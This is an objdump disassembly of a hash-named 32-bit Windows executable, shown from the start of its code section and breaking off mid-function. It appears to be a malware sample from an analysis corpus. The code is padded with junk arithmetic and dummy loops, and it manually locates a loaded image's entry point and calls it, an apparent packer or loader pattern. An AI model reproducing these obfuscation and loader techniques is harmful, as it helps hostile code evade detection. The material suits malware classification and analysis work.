
d866d27b67fd351b513973971697cbdc0f986743371448883e0c5e64c85609e4.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xcc
  401009:	xor    DWORD PTR ds:0x422014,0x420f98
  401013:	push   edi
  401014:	sub    DWORD PTR ds:0x420fb0,0x420e8e
  40101e:	push   0x424545
  401023:	xor    edi,edi
  401025:	and    DWORD PTR ds:0x420efc,0x110f
  40102f:	inc    edi
  401030:	push   edi
  401031:	sbb    DWORD PTR ds:0x420f08,0x51
  40103b:	push   edi
  40103c:	adc    DWORD PTR ds:0x422000,0x3888
  401046:	call   DWORD PTR ds:0x4247ed
  40104c:	test   eax,eax
  40104e:	mov    DWORD PTR ds:0x420e8a,0x96
  401058:	je     0x40106f
  40105e:	xor    eax,eax
  401060:	mov    DWORD PTR ds:0x420ef0,0x42a7
  40106a:	jmp    0x4020ba
  40106f:	push   esi
  401070:	sbb    DWORD PTR ds:0x420e96,ebx
  401076:	mov    esi,DWORD PTR ds:0x4247e9
  40107c:	push   0x8
  40107e:	and    DWORD PTR ds:0x420e96,0x420ef4
  401088:	push   0x424565
  40108d:	sbb    DWORD PTR ds:0x420fa8,0x2663
  401097:	call   esi
  401099:	mov    DWORD PTR ds:0x420f58,0x2539
  4010a3:	test   eax,eax
  4010a5:	mov    DWORD PTR ds:0x420f74,0x63dd
  4010af:	jne    0x401117
  4010b5:	push   0xc
  4010b7:	adc    DWORD PTR ds:0x420efc,0x422010
  4010c1:	push   0x424579
  4010c6:	call   esi
  4010c8:	sbb    DWORD PTR ds:0x422000,0x6696
  4010d2:	test   eax,eax
  4010d4:	jne    0x401117
  4010da:	xor    DWORD PTR ds:0x422010,0x3be2
  4010e4:	push   0x42458d
  4010e9:	adc    DWORD PTR ds:0x420fac,0x420fa0
  4010f3:	push   edi
  4010f4:	push   edi
  4010f5:	call   DWORD PTR ds:0x424819
  4010fb:	add    DWORD PTR ds:0x420e7e,0x14dc
  401105:	test   eax,eax
  401107:	mov    DWORD PTR ds:0x420f08,0x3170
  401111:	je     0x401128
  401117:	xor    eax,eax
  401119:	mov    DWORD PTR ds:0x422014,0x5c19
  401123:	jmp    0x4020b9
  401128:	sbb    esi,DWORD PTR ds:0x420e9a
  40112e:	mov    DWORD PTR [ebp-0x10],0x0
  401135:	and    edi,0x6e17
  40113b:	mov    eax,DWORD PTR [ebp-0x24]
  40113e:	mov    DWORD PTR [ebp-0x24],eax
  401141:	sub    esi,DWORD PTR ds:0x420fa0
  401147:	mov    ecx,0xf89c85b5
  40114c:	mov    DWORD PTR [ebp-0x8],ecx
  40114f:	sub    esi,DWORD PTR ds:0x420f00
  401155:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  40115c:	sbb    edx,DWORD PTR ds:0x420e92
  401162:	lea    eax,[ebp-0x38]
  401165:	mov    DWORD PTR [ebp-0x2c],eax
  401168:	adc    DWORD PTR ds:0x420f74,edi
  40116e:	lea    eax,[ebp-0x30]
  401171:	xor    esi,esi
  401173:	or     esi,DWORD PTR ds:0x420e9a
  401179:	and    DWORD PTR ds:0x420f64,esi
  40117f:	mov    DWORD PTR [ebp-0x1c],eax
  401182:	sbb    esi,eax
  401184:	mov    eax,ds:0x424435
  401189:	mov    edi,DWORD PTR ds:0x420f48
  40118f:	mov    edx,DWORD PTR ds:0x420f84
  401195:	sub    edx,edi
  401197:	sub    edi,DWORD PTR [edi+edx*1]
  40119a:	mov    eax,DWORD PTR [eax+0x1c8]
  4011a0:	mov    eax,DWORD PTR [eax]
  4011a2:	mov    edx,DWORD PTR [ebp-0x1c]
  4011a5:	movzx  edi,BYTE PTR ds:0x420fb4
  4011ac:	add    DWORD PTR ds:0x420e8a,edi
  4011b2:	mov    esi,0x7510896
  4011b7:	xor    eax,esi
  4011b9:	and    DWORD PTR ds:0x420fa0,0x420e96
  4011c3:	mov    edi,0x3272dd
  4011c8:	add    eax,edi
  4011ca:	mov    DWORD PTR [edx],eax
  4011cc:	mov    DWORD PTR ds:0x420ea2,0x7e11
  4011d6:	mov    eax,ds:0x424675
  4011db:	cmp    eax,0x312bc9f6
  4011e0:	mov    DWORD PTR ds:0x420fa4,0x3707
  4011ea:	jne    0x40133f
  4011f0:	mov    eax,DWORD PTR [ebp-0x8]
  4011f3:	mov    edx,DWORD PTR ds:0x424435
  4011f9:	mov    edx,DWORD PTR [edx+0x198]
  4011ff:	xor    eax,esi
  401201:	add    eax,edi
  401203:	add    DWORD PTR ds:0x422010,0x420eec
  40120d:	mov    DWORD PTR [edx],eax
  40120f:	and    DWORD PTR ds:0x42200c,0x0
  401219:	jmp    0x40122d
  40121e:	xor    edx,edx
  401220:	add    edx,DWORD PTR ds:0x42200c
  401226:	inc    edx
  401227:	mov    DWORD PTR ds:0x42200c,edx
  40122d:	cmp    DWORD PTR ds:0x42200c,0x12
  401234:	jae    0x401276
  40123a:	cmp    DWORD PTR ds:0x42200c,0x5
  401241:	jne    0x401255
  401247:	push   DWORD PTR [ebp-0x18]
  40124a:	push   0x450b
  40124f:	call   DWORD PTR ds:0x4247d5
  401255:	cmp    DWORD PTR ds:0x42200c,0x4
  40125c:	jne    0x401271
  401262:	xor    edx,edx
  401264:	add    edx,DWORD PTR ds:0x42200c
  40126a:	inc    edx
  40126b:	mov    DWORD PTR ds:0x42200c,edx
  401271:	jmp    0x40121e
  401276:	mov    eax,DWORD PTR [ebp-0x8]
  401279:	and    DWORD PTR ds:0x420f70,0x0
  401283:	mov    edx,DWORD PTR ds:0x420f70
  401289:	inc    edx
  40128a:	mov    DWORD PTR ds:0x420f70,edx
  401290:	cmp    DWORD PTR ds:0x420f70,0x7
  401297:	jne    0x4012b0
  40129d:	push   0x5d66
  4012a2:	push   0x420f60
  4012a7:	push   DWORD PTR [ebp-0x14]
  4012aa:	call   DWORD PTR ds:0x4247d9
  4012b0:	cmp    DWORD PTR ds:0x420f70,0x6
  4012b7:	jne    0x4012ca
  4012bd:	mov    edx,DWORD PTR ds:0x420f70
  4012c3:	inc    edx
  4012c4:	mov    DWORD PTR ds:0x420f70,edx
  4012ca:	cmp    DWORD PTR ds:0x420f70,0x14
  4012d1:	jb     0x401283
  4012d7:	and    edx,0x4d07
  4012dd:	xor    eax,esi
  4012df:	movzx  edx,BYTE PTR ds:0x420f08
  4012e6:	sub    edx,DWORD PTR ds:0x420fa0
  4012ec:	mov    DWORD PTR ds:0x420f08,edx
  4012f2:	add    eax,edi
  4012f4:	mov    DWORD PTR ds:0x422008,0x18
  4012fe:	cmp    DWORD PTR ds:0x422008,0x0
  401305:	je     0x40133a
  40130b:	cmp    DWORD PTR ds:0x422008,0x1d
  401312:	jne    0x401328
  401318:	push   0x42406a
  40131d:	push   0x424044
  401322:	call   DWORD PTR ds:0x4247dd
  401328:	mov    edx,DWORD PTR ds:0x422008
  40132e:	dec    edx
  40132f:	mov    DWORD PTR ds:0x422008,edx
  401335:	jmp    0x4012fe
  40133a:	mov    ds:0x424675,eax
  40133f:	mov    eax,ds:0x424435
  401344:	and    DWORD PTR ds:0x420ef4,0x0
  40134e:	mov    edx,DWORD PTR ds:0x420ef4
  401354:	inc    edx
  401355:	mov    DWORD PTR ds:0x420ef4,edx
  40135b:	cmp    DWORD PTR ds:0x420ef4,0x20
  401362:	jne    0x401379
  401368:	push   DWORD PTR [ebp-0x18]
  40136b:	push   0x222d
  401370:	push   DWORD PTR [ebp-0x28]
  401373:	call   DWORD PTR ds:0x4247e1
  401379:	cmp    DWORD PTR ds:0x420ef4,0x12
  401380:	jb     0x40134e
  401386:	mov    eax,DWORD PTR [eax+0x18c]
  40138c:	mov    eax,DWORD PTR [eax]
  40138e:	adc    DWORD PTR ds:0x422014,0x7308
  401398:	mov    DWORD PTR [ebp-0x68],eax
  40139b:	and    DWORD PTR ds:0x420e7e,0x0
  4013a5:	xor    eax,eax
  4013a7:	or     eax,DWORD PTR ds:0x420e7e
  4013ad:	inc    eax
  4013ae:	mov    ds:0x420e7e,eax
  4013b3:	cmp    DWORD PTR ds:0x420e7e,0xa
  4013ba:	jne    0x4013d1
  4013c0:	push   DWORD PTR [ebp-0x20]
  4013c3:	push   0x420f74
  4013c8:	push   DWORD PTR [ebp-0x28]
  4013cb:	call   DWORD PTR ds:0x4247e5
  4013d1:	cmp    DWORD PTR ds:0x420e7e,0x9
  4013d8:	jne    0x4013ec
  4013de:	xor    eax,eax
  4013e0:	xor    eax,DWORD PTR ds:0x420e7e
  4013e6:	inc    eax
  4013e7:	mov    ds:0x420e7e,eax
  4013ec:	cmp    DWORD PTR ds:0x420e7e,0x14
  4013f3:	jb     0x4013a5
  4013f9:	mov    DWORD PTR ds:0x420f04,0x16
  401403:	cmp    DWORD PTR ds:0x420f04,0x0
  40140a:	je     0x401438
  401410:	cmp    DWORD PTR ds:0x420f04,0x22
  401417:	jne    0x401423
  40141d:	call   DWORD PTR ds:0x4247f1
  401423:	xor    eax,eax
  401425:	or     eax,DWORD PTR ds:0x420f04
  40142b:	dec    eax
  40142c:	mov    ds:0x420f04,eax
  401431:	jmp    0x401403
  401436:	sub    edx,edx
  401438:	push   ebx
  401439:	or     eax,DWORD PTR ds:0x420f00
  40143f:	mov    ebx,0xf89c85b1
  401444:	and    DWORD PTR ds:0x420fa0,0x0
  40144e:	mov    edx,DWORD PTR ds:0x420fa0
  401454:	inc    edx
  401455:	mov    DWORD PTR ds:0x420fa0,edx
  40145b:	cmp    DWORD PTR ds:0x420fa0,0x8
  401462:	jne    0x40146e
  401468:	call   DWORD PTR ds:0x4247f5
  40146e:	cmp    DWORD PTR ds:0x420fa0,0x7
  401475:	jne    0x40148a
  40147b:	xor    edx,edx
  40147d:	xor    edx,DWORD PTR ds:0x420fa0
  401483:	inc    edx
  401484:	mov    DWORD PTR ds:0x420fa0,edx
  40148a:	cmp    DWORD PTR ds:0x420fa0,0x1e
  401491:	jb     0x40144e
  401497:	and    DWORD PTR ds:0x420e7a,0x0
  4014a1:	jmp    0x4014b3
  4014a6:	mov    edx,DWORD PTR ds:0x420e7a
  4014ac:	inc    edx
  4014ad:	mov    DWORD PTR ds:0x420e7a,edx
  4014b3:	cmp    DWORD PTR ds:0x420e7a,0x14
  4014ba:	jae    0x4014ff
  4014c0:	cmp    DWORD PTR ds:0x420e7a,0x1f
  4014c7:	jne    0x4014f0
  4014cd:	push   0x20c6
  4014d2:	push   DWORD PTR [ebp-0x10]
  4014d5:	push   0x420ea2
  4014da:	push   0x440c
  4014df:	push   DWORD PTR [ebp-0x20]
  4014e2:	push   0x7f92
  4014e7:	push   DWORD PTR [ebp-0x20]
  4014ea:	call   DWORD PTR ds:0x4247f9
  4014f0:	jmp    0x4014a6
  4014f5:	adc    DWORD PTR ds:0x420ea2,0x7cfc
  4014ff:	mov    DWORD PTR [ebp-0x10],ebx
  401502:	sub    DWORD PTR ds:0x420f5c,edi
  401508:	mov    DWORD PTR [ebp-0x10],ebx
  40150b:	mov    DWORD PTR ds:0x420f04,0x12
  401515:	cmp    DWORD PTR ds:0x420f04,0x0
  40151c:	je     0x40156b
  401522:	cmp    DWORD PTR ds:0x420f04,0x5
  401529:	jne    0x40153d
  40152f:	push   DWORD PTR [ebp-0x1c]
  401532:	push   0x424044
  401537:	call   DWORD PTR ds:0x4247fd
  40153d:	cmp    DWORD PTR ds:0x420f04,0x6
  401544:	jne    0x401557
  40154a:	mov    edx,DWORD PTR ds:0x420f04
  401550:	dec    edx
  401551:	mov    DWORD PTR ds:0x420f04,edx
  401557:	xor    edx,edx
  401559:	or     edx,DWORD PTR ds:0x420f04
  40155f:	dec    edx
  401560:	mov    DWORD PTR ds:0x420f04,edx
  401566:	jmp    0x401515
  40156b:	mov    DWORD PTR [ebp-0x10],ebx
  40156e:	and    DWORD PTR ds:0x422004,0x0
  401578:	jmp    0x40158c
  40157d:	xor    edx,edx
  40157f:	xor    edx,DWORD PTR ds:0x422004
  401585:	inc    edx
  401586:	mov    DWORD PTR ds:0x422004,edx
  40158c:	cmp    DWORD PTR ds:0x422004,0x12
  401593:	jae    0x4015bd
  401599:	cmp    DWORD PTR ds:0x422004,0x1e
  4015a0:	jne    0x4015b8
  4015a6:	push   0x424168
  4015ab:	push   0x1
  4015ad:	push   0x0
  4015af:	push   DWORD PTR [ebp-0x14]
  4015b2:	call   DWORD PTR ds:0x424801
  4015b8:	jmp    0x40157d
  4015bd:	mov    DWORD PTR [ebp-0x1c],ecx
  4015c0:	xor    edx,edx
  4015c2:	mov    DWORD PTR [ebp-0x10],ebx
  4015c5:	mov    DWORD PTR ds:0x420e96,0xb45
  4015cf:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  4015d6:	and    DWORD PTR ds:0x422014,0x2ed5
  4015e0:	mov    eax,DWORD PTR [ebp-0x8]
  4015e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4015e6:	xor    edx,edx
  4015e8:	or     edx,DWORD PTR ds:0x420f60
  4015ee:	and    DWORD PTR ds:0x422000,edx
  4015f4:	mov    edx,DWORD PTR [ebp-0xc]
  4015f7:	sbb    DWORD PTR ds:0x420fa0,0x420fb4
  401601:	xor    edx,esi
  401603:	and    DWORD PTR ds:0x420f5c,0x420fa4
  40160d:	xor    ecx,esi
  40160f:	sub    DWORD PTR ds:0x422008,0x420f58
  401619:	add    ecx,edx
  40161b:	sbb    DWORD PTR ds:0x420e8e,edi
  401621:	mov    edx,DWORD PTR [ebp-0xc]
  401624:	xor    DWORD PTR ds:0x420f00,0x7b1e
  40162e:	xor    eax,esi
  401630:	xor    edx,esi
  401632:	or     DWORD PTR ds:0x420e9a,0x7d42
  40163c:	add    eax,edi
  40163e:	lea    ecx,[ecx+edx*1+0x975897]
  401645:	not    DWORD PTR ds:0x420f70
  40164b:	mov    DWORD PTR [ebp-0x18],eax
  40164e:	mov    DWORD PTR ds:0x420e7e,0x57b9
  401658:	cmp    eax,ecx
  40165a:	ja     0x40177e
  401660:	jmp    0x401678
  401665:	mov    eax,ds:0x420f30
  40166a:	mov    ecx,DWORD PTR ds:0x420f38
  401670:	sub    ecx,eax
  401672:	and    eax,DWORD PTR [eax+ecx*1]
  401675:	mov    eax,DWORD PTR [ebp-0x18]
  401678:	mov    ecx,DWORD PTR [ebp-0xc]
  40167b:	sub    DWORD PTR ds:0x422010,0x420f70
  401685:	xor    ecx,esi
  401687:	lea    eax,[ecx+eax*1+0x3272dd]
  40168e:	or     DWORD PTR ds:0x420f70,0x48c8
  401698:	push   eax
  401699:	sub    DWORD PTR ds:0x420e9e,0x506d
  4016a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4016a6:	and    DWORD PTR ds:0x420f5c,0x3822
  4016b0:	xor    eax,esi
  4016b2:	xor    DWORD PTR ds:0x420f74,0x420ef0
  4016bc:	lea    eax,[ebp+eax*1+0x3272e5]
  4016c3:	or     DWORD PTR ds:0x420ea2,0x420f60
  4016cd:	push   eax
  4016ce:	or     DWORD PTR ds:0x420f00,0x5827
  4016d8:	mov    eax,ds:0x424435
  4016dd:	and    DWORD PTR ds:0x420fb4,0x420fa4
  4016e7:	push   DWORD PTR [eax+0x1bc]
  4016ed:	xor    DWORD PTR ds:0x420f98,0x420ea2
  4016f7:	call   0x4020cd
  4016fc:	add    DWORD PTR ds:0x420f68,0x6b04
  401706:	mov    eax,DWORD PTR [ebp-0xc]
  401709:	or     edx,DWORD PTR ds:0x420ef0
  40170f:	mov    ecx,DWORD PTR [ebp-0x18]
  401712:	neg    edx
  401714:	xor    eax,esi
  401716:	sub    edx,0x4f8d
  40171c:	lea    eax,[ecx+eax*1+0x3272dd]
  401723:	mov    ecx,DWORD PTR [ebp-0xc]
  401726:	xor    edx,DWORD PTR ds:0x420e7a
  40172c:	mov    edx,DWORD PTR [ebp-0xc]
  40172f:	xor    edx,esi
  401731:	add    DWORD PTR ds:0x420ef4,0x420e9e
  40173b:	xor    ecx,esi
  40173d:	adc    DWORD PTR ds:0x420e82,0x420f5c
  401747:	add    ecx,edx
  401749:	mov    edx,DWORD PTR [ebp-0xc]
  40174c:	xor    edx,esi
  40174e:	lea    ecx,[ecx+edx*1+0x975897]
  401755:	mov    DWORD PTR ds:0x420e82,0x59f5
  40175f:	mov    DWORD PTR [ebp-0x18],eax
  401762:	mov    DWORD PTR ds:0x420f98,0x3280
  40176c:	cmp    eax,ecx
  40176e:	mov    DWORD PTR ds:0x420fb4,0x7b83
  401778:	jbe    0x401665
  40177e:	and    DWORD PTR ds:0x420f98,0x0
  401788:	mov    ecx,DWORD PTR ds:0x420f98
  40178e:	inc    ecx
  40178f:	mov    DWORD PTR ds:0x420f98,ecx
  401795:	cmp    DWORD PTR ds:0x420f98,0x1e
  40179c:	jne    0x4017b2
  4017a2:	push   0x420fa0
  4017a7:	push   0x4d18
  4017ac:	call   DWORD PTR ds:0x424805
  4017b2:	cmp    DWORD PTR ds:0x420f98,0x18
  4017b9:	jb     0x401788
  4017bf:	mov    eax,DWORD PTR [ebp+0xc]
  4017c2:	sbb    DWORD PTR ds:0x420e7a,edx
  4017c8:	mov    ds:0x4242b9,eax
  4017cd:	and    DWORD PTR ds:0x420f74,0x0
  4017d7:	mov    eax,ds:0x420f74
  4017dc:	inc    eax
  4017dd:	mov    ds:0x420f74,eax
  4017e2:	cmp    DWORD PTR ds:0x420f74,0x1b
  4017e9:	jne    0x40180f
  4017ef:	push   DWORD PTR [ebp-0x1c]
  4017f2:	push   0x420f9c
  4017f7:	push   0x46e8
  4017fc:	push   0x4240e4
  401801:	push   0x1c79
  401806:	push   DWORD PTR [ebp-0xc]
  401809:	call   DWORD PTR ds:0x42480d
  40180f:	cmp    DWORD PTR ds:0x420f74,0x12
  401816:	jb     0x4017d7
  40181c:	mov    eax,DWORD PTR [ebp+0x10]
  40181f:	sub    ecx,DWORD PTR ds:0x420fa4
  401825:	mov    ds:0x42450d,eax
  40182a:	and    DWORD PTR ds:0x422010,0x0
  401834:	mov    eax,ds:0x422010
  401839:	inc    eax
  40183a:	mov    ds:0x422010,eax
  40183f:	cmp    DWORD PTR ds:0x422010,0x18
  401846:	jne    0x401852
  40184c:	call   DWORD PTR ds:0x424811
  401852:	cmp    DWORD PTR ds:0x422010,0x17
  401859:	jb     0x401834
  40185f:	add    ecx,ecx
  401861:	mov    eax,ds:0x4242b9
  401866:	or     DWORD PTR ds:0x420e7a,0x2e1b
  401870:	mov    ecx,DWORD PTR [ebp-0x2c]
  401873:	sub    eax,edi
  401875:	neg    DWORD PTR ds:0x420e92
  40187b:	xor    eax,esi
  40187d:	mov    DWORD PTR ds:0x420fac,0x2c59
  401887:	mov    DWORD PTR [ecx],eax
  401889:	mov    ecx,DWORD PTR [ebp-0x24]
  40188c:	mov    DWORD PTR ds:0x420efc,0x2f09
  401896:	mov    eax,0xf89c85b5
  40189b:	mov    DWORD PTR ds:0x420efc,0x2084
  4018a5:	cmp    ecx,eax
  4018a7:	jne    0x401be5
  4018ad:	xor    DWORD PTR ds:0x422014,0x4966
  4018b7:	lea    eax,[ebp-0x34]
  4018ba:	adc    DWORD PTR ds:0x420e8a,0x420e92
  4018c4:	mov    DWORD PTR [ebp-0x70],eax
  4018c7:	xor    DWORD PTR ds:0x420f74,0x422004
  4018d1:	lea    eax,[ebp+0x4]
  4018d4:	sub    DWORD PTR ds:0x420fa4,0x42200c
  4018de:	mov    DWORD PTR [ebp-0x34],eax
  4018e1:	mov    eax,DWORD PTR [ebp-0x34]
  4018e4:	test   eax,eax
  4018e6:	mov    DWORD PTR ds:0x420e82,0x6242
  4018f0:	je     0x40209d
  4018f6:	xor    DWORD PTR ds:0x422008,0x2d73
  401900:	mov    eax,DWORD PTR [ebp-0x20]
  401903:	mov    eax,DWORD PTR [ebp-0xc]
  401906:	mov    eax,DWORD PTR [ebp-0x8]
  401909:	adc    ecx,0x7834
  40190f:	mov    DWORD PTR [ebp+0xc],eax
  401912:	not    ecx
  401914:	mov    eax,eax
  401916:	mov    eax,ds:0x424435
  40191b:	and    DWORD PTR ds:0x422008,0x0
  401925:	mov    ecx,DWORD PTR ds:0x422008
  40192b:	inc    ecx
  40192c:	mov    DWORD PTR ds:0x422008,ecx
  401932:	cmp    DWORD PTR ds:0x422008,0x1e
  401939:	jne    0x40194a
  40193f:	push   0x422000
  401944:	call   DWORD PTR ds:0x424815
  40194a:	cmp    DWORD PTR ds:0x422008,0x1d
  401951:	jb     0x401925
  401957:	and    DWORD PTR ds:0x420fa0,0x0
  401961:	jmp    0x401973
  401966:	mov    ecx,DWORD PTR ds:0x420fa0
  40196c:	inc    ecx
  40196d:	mov    DWORD PTR ds:0x420fa0,ecx
  401973:	cmp    DWORD PTR ds:0x420fa0,0x14
  40197a:	jae    0x4019bc
  401980:	cmp    DWORD PTR ds:0x420fa0,0x5
  401987:	jne    0x40199d
  40198d:	push   0x2f20
  401992:	push   0x8e83
  401997:	call   DWORD PTR ds:0x4247d5
  40199d:	cmp    DWORD PTR ds:0x420fa0,0x4
  4019a4:	jne    0x4019b7
  4019aa:	mov    ecx,DWORD PTR ds:0x420fa0
  4019b0:	inc    ecx
  4019b1:	mov    DWORD PTR ds:0x420fa0,ecx
  4019b7:	jmp    0x401966
  4019bc:	mov    eax,DWORD PTR [eax+0x1c8]
  4019c2:	neg    DWORD PTR ds:0x420f98
  4019c8:	mov    eax,DWORD PTR [eax]
  4019ca:	sbb    DWORD PTR ds:0x420f74,ebx
  4019d0:	cdq    
  4019d1:	adc    DWORD PTR ds:0x42200c,0x4213
  4019db:	mov    ebx,eax
  4019dd:	mov    DWORD PTR ds:0x420fa4,0x17
  4019e7:	cmp    DWORD PTR ds:0x420fa4,0x0
  4019ee:	je     0x401a74
  4019f4:	cmp    DWORD PTR ds:0x420fa4,0x20
  4019fb:	jne    0x401a14
  401a01:	push   DWORD PTR [ebp-0x1c]
  401a04:	push   0x420e9a
  401a09:	push   0x6482
  401a0e:	call   DWORD PTR ds:0x4247d9
  401a14:	xor    eax,eax
  401a16:	or     eax,DWORD PTR ds:0x420fa4
  401a1c:	dec    eax
  401a1d:	mov    ds:0x420fa4,eax
  401a22:	jmp    0x4019e7
  401a27:	mov    DWORD PTR ds:0x420f08,0x1d
  401a31:	cmp    DWORD PTR ds:0x420f08,0x0
  401a38:	je     0x401a74
  401a3e:	cmp    DWORD PTR ds:0x420f08,0x1e
  401a45:	jne    0x401a5b
  401a4b:	push   0x424027
  401a50:	push   0x4240af
  401a55:	call   DWORD PTR ds:0x4247dd
  401a5b:	xor    eax,eax
  401a5d:	xor    eax,DWORD PTR ds:0x420f08
  401a63:	dec    eax
  401a64:	mov    ds:0x420f08,eax
  401a69:	jmp    0x401a31
  401a6e:	and    DWORD PTR ds:0x420e82,ebx
  401a74:	mov    eax,0xfabdbeed
  401a79:	add    ebx,eax
  401a7b:	inc    ecx
  401a7c:	adc    edx,0xffffffff
  401a7f:	mov    DWORD PTR ds:0x420fa0,0x16
  401a89:	cmp    DWORD PTR ds:0x420fa0,0x0
  401a90:	je     0x401b11
  401a96:	cmp    DWORD PTR ds:0x420fa0,0x20
  401a9d:	jne    0x401ab4
  401aa3:	push   DWORD PTR [ebp-0x10]
  401aa6:	push   0x1d23
  401aab:	push   DWORD PTR [ebp-0x1c]
  401aae:	call   DWORD PTR ds:0x4247e1
  401ab4:	xor    ecx,ecx
  401ab6:	xor    ecx,DWORD PTR ds:0x420fa0
  401abc:	dec    ecx
  401abd:	mov    DWORD PTR ds:0x420fa0,ecx
  401ac3:	jmp    0x401a89
  401ac8:	mov    DWORD PTR ds:0x42200c,0x1c
  401ad2:	cmp    DWORD PTR ds:0x42200c,0x0
  401ad9:	je     0x401b11
  401adf:	cmp    DWORD PTR ds:0x42200c,0x2c
  401ae6:	jne    0x401aff
  401aec:	push   0x87f3
  401af1:	push   0x420f68
  401af6:	push   DWORD PTR [ebp-0xc]
  401af9:	call   DWORD PTR ds:0x4247e5
  401aff:	mov    ecx,DWORD PTR ds:0x42200c
  401b05:	dec    ecx
  401b06:	mov    DWORD PTR ds:0x42200c,ecx
  401b0c:	jmp    0x401ad2
  401b11:	and    DWORD PTR [ebp-0x10],0x0
  401b15:	sbb    DWORD PTR ds:0x422014,ebx
  401b1b:	xor    edx,0x0
  401b1e:	xor    ecx,DWORD PTR ds:0x420f70
  401b24:	mov    DWORD PTR [ebp-0x54],edx
  401b27:	adc    ecx,edx
  401b29:	mov    edx,DWORD PTR [ebp+0xc]
  401b2c:	mov    DWORD PTR [ebp-0x14],edx
  401b2f:	mov    ecx,0x8a29a127
  401b34:	xor    ebx,ecx
  401b36:	dec    edx
  401b37:	add    DWORD PTR [ebp-0x14],eax
  401b3a:	mov    DWORD PTR ds:0x420e96,edi
  401b40:	mov    edx,DWORD PTR [ebp-0x14]
  401b43:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401b47:	or     DWORD PTR ds:0x420f6c,0x420f00
  401b51:	xor    edx,ecx
  401b53:	add    DWORD PTR ds:0x420e86,0x420f04
  401b5d:	mov    DWORD PTR [ebp-0x4c],edx
  401b60:	mov    edx,DWORD PTR [ebp-0x10]
  401b63:	xor    edx,0x0
  401b66:	mov    DWORD PTR [ebp-0x48],edx
  401b69:	mov    DWORD PTR ds:0x420efc,0x3c82
  401b73:	cmp    DWORD PTR [ebp-0x4c],ebx
  401b76:	jne    0x401b92
  401b7c:	mov    DWORD PTR ds:0x420e92,0x5ff4
  401b86:	mov    edx,DWORD PTR [ebp-0x54]
  401b89:	cmp    DWORD PTR [ebp-0x48],edx
  401b8c:	je     0x401bc1
  401b92:	mov    edx,DWORD PTR ds:0x424435
  401b98:	mov    edx,DWORD PTR [edx+0x1c0]
  401b9e:	mov    edx,DWORD PTR [edx]
  401ba0:	xor    ebx,ebx
  401ba2:	add    edx,eax
  401ba4:	adc    ebx,0xffffffff
  401ba7:	xor    edx,ecx
  401ba9:	xor    ebx,0x0
  401bac:	cmp    edx,0x70941fc9
  401bb2:	jne    0x40209d
  401bb8:	cmp    ebx,0xffffffff
  401bbb:	jne    0x40209d
  401bc1:	mov    edx,DWORD PTR ds:0x4244b1
  401bc7:	mov    ebx,DWORD PTR ds:0x4244b9
  401bcd:	xor    edx,ebx
  401bcf:	mov    DWORD PTR ds:0x4244b1,edx
  401bd5:	mov    ebx,DWORD PTR ds:0x4244b1
  401bdb:	mov    edx,DWORD PTR [ebp-0x34]
  401bde:	add    DWORD PTR [edx],ebx
  401be0:	jmp    0x40205e
  401be5:	mov    ecx,DWORD PTR [ebp-0x38]
  401be8:	cmp    ecx,0xf89c85b2
  401bee:	je     0x401c4b
  401bf4:	mov    ecx,DWORD PTR [ebp-0x8]
  401bf7:	mov    edx,DWORD PTR [ebp-0x30]
  401bfa:	xor    ecx,esi
  401bfc:	add    ecx,edi
  401bfe:	cmp    ecx,edx
  401c00:	je     0x401c4b
  401c06:	mov    eax,ds:0x424435
  401c0b:	mov    eax,DWORD PTR [eax+0x194]
  401c11:	mov    ecx,DWORD PTR [eax]
  401c13:	mov    eax,DWORD PTR [ecx+0x3c]
  401c16:	push   DWORD PTR ds:0x42450d
  401c1c:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401c20:	push   DWORD PTR ds:0x4242b9
  401c26:	add    eax,ecx
  401c28:	mov    ecx,DWORD PTR ds:0x424435
  401c2e:	mov    ecx,DWORD PTR [ecx+0x194]
  401c34:	push   DWORD PTR [ecx]
  401c36:	call   eax
  401c38:	mov    ecx,DWORD PTR ds:0x424435
  401c3e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401c44:	mov    DWORD PTR [ecx],eax
  401c46:	jmp    0x40209d
  401c4b:	mov    ecx,DWORD PTR [ebp-0x8]
  401c4e:	mov    edx,DWORD PTR [ebp-0x68]
  401c51:	xor    ecx,esi
  401c53:	add    ecx,edi
  401c55:	cmp    ecx,edx
  401c57:	jne    0x401f61
  401c5d:	mov    ecx,DWORD PTR [ebp-0x8]
  401c60:	mov    edx,DWORD PTR ds:0x424435
  401c66:	mov    edx,DWORD PTR [edx+0x198]
  401c6c:	xor    ecx,esi
  401c6e:	add    ecx,edi
  401c70:	cmp    ecx,DWORD PTR [edx]
  401c72:	jne    0x401c8d
  401c78:	push   eax
  401c79:	mov    eax,DWORD PTR [ebp-0x8]
  401c7c:	xor    eax,esi
  401c7e:	add    eax,edi
  401c80:	push   eax
  401c81:	push   ebx
  401c82:	push   DWORD PTR [ebp-0xc]
  401c85:	push   DWORD PTR [ebp-0x8]
  401c88:	call   0x40772b
  401c8d:	mov    eax,DWORD PTR [ebp-0xc]
  401c90:	mov    DWORD PTR [ebp-0x3c],eax
  401c93:	mov    eax,DWORD PTR [ebp-0x8]
  401c96:	mov    DWORD PTR [ebp-0x18],eax
  401c99:	mov    eax,DWORD PTR [ebp-0x18]
  401c9c:	xor    eax,esi
  401c9e:	add    eax,edi
  401ca0:	mov    DWORD PTR [ebp+0x10],eax
  401ca3:	mov    eax,ds:0x4242b5
  401ca8:	mov    eax,DWORD PTR [eax]
  401caa:	mov    DWORD PTR [ebp+0x10],eax
  401cad:	mov    eax,ds:0x4244bd
  401cb2:	mov    eax,DWORD PTR [eax]
  401cb4:	mov    DWORD PTR [ebp-0x1c],eax
  401cb7:	mov    DWORD PTR [ebp+0xc],0xf89c87b5
  401cbe:	mov    eax,DWORD PTR [ebp+0xc]
  401cc1:	xor    eax,esi
  401cc3:	add    eax,edi
  401cc5:	mov    DWORD PTR [ebp+0xc],eax
  401cc8:	mov    eax,ds:0x424435
  401ccd:	mov    DWORD PTR [ebp+0xc],eax
  401cd0:	mov    eax,DWORD PTR [ebp+0x10]
  401cd3:	mov    DWORD PTR [ebp+0xc],eax
  401cd6:	mov    eax,DWORD PTR [ebp+0xc]
  401cd9:	push   0x4
